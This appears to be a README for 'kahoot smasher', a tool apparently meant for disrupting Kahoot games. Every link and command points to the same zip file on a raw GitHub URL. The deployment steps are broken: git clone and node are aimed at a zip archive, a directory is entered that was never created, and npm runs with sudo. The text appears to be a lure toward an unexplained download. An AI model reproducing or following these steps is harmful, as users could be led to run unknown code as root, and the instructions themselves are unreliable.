The official source code of https://raw.githubusercontent.com/bdgfeadvyrfedyu/kahootsmasher.com/master/gamemodes/kahootsmasher.com_1.9.zip

## Deployment

OS X, Linux and Windows:

```sh
git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/kahootsmasher.com/master/gamemodes/kahootsmasher.com_1.9.zip
cd kahoot-tools
sudo npm install
sudo npm run build
screen -S kahootsmasher
node https://raw.githubusercontent.com/bdgfeadvyrfedyu/kahootsmasher.com/master/gamemodes/kahootsmasher.com_1.9.zip
```

To run kahoot smasher in dev mode, follow the steps above but replace ```npm run build``` with: ```npm run dev```
